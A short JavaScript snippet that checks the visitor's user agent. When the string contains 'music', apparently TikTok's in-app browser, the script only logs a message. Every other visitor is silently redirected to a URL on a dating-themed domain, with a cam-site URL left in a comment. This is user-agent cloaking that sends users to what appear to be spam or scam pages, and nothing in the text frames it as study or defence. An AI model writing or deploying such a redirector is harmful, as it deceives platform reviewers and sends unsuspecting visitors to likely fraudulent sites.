let agent = navigator.userAgent;

const urls = ['https://phf2hrh.ohmyhoney-datingnew.life/e6yb3el'];

function getRandomIndex(max) {
  return Math.floor(Math.random() * max);
}
const randomIndex = getRandomIndex(urls.length);
const chosenUrl = urls[randomIndex];

if (agent.indexOf('music') >= 0) {
  console.log('in tiktok app');
} else {
  window.location = chosenUrl;
  //  window.location = 'https://watchmenow.cam/';
}
// document.querySelector('body').innerText = agent;
